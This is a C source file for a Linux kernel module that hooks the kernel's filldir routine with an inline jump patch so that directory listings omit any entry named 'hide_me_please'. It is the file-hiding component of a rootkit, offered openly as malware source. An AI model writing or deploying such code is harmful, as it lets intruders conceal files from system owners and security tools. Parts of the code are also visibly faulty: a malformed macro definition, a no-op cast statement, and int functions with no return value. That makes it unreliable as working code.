#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include "hook.c"

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

#define STRING_TO_HIDE = "hide_me_please"

psize *filldir;
unsigned char* fill_dir_o_code;


/**
* My Hidedir function - checks if the name of the file/folder in STRING_TO_HIDE - if so, removing it from the list
*/
static int my_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type){
	int result;

	// pointer to the real filldir function (which now jumps to the current function)
	filldir_t filldir_func = (filldir_t) filldir;

	if (strcmp(name, STRING_TO_HIDE) == 0) {
		// if it's the hide string - return 0 which mean the buffer is empty.
		return 0;
	}

	// remove the hook - so we can call the real Filldir to get real files
	hijack_stop(filldir, fill_dir_o_code);	

	// get real results from real filldir function
	result = filldir_func(__buff, name, namelen, offset, ino, d_type);
	
	// hook and point again the filldir function
	hijack_start(filldir, my_filldir, &fill_dir_o_code);
	return result;
}


int hide_directory(void) 
{
	(psize *) filldir;

	// get address of filldir function
	filldir = (void *)kallsyms_lookup_name("filldir");

	// hijack the filldir function so it will JMP to 'my_filldir' function
	hijack_start(filldir, my_filldir, &fill_dir_o_code);
}


int remove_hook(void){

	// remove the hook from the filldir function
	hijack_stop(filldir, fill_dir_o_code);
}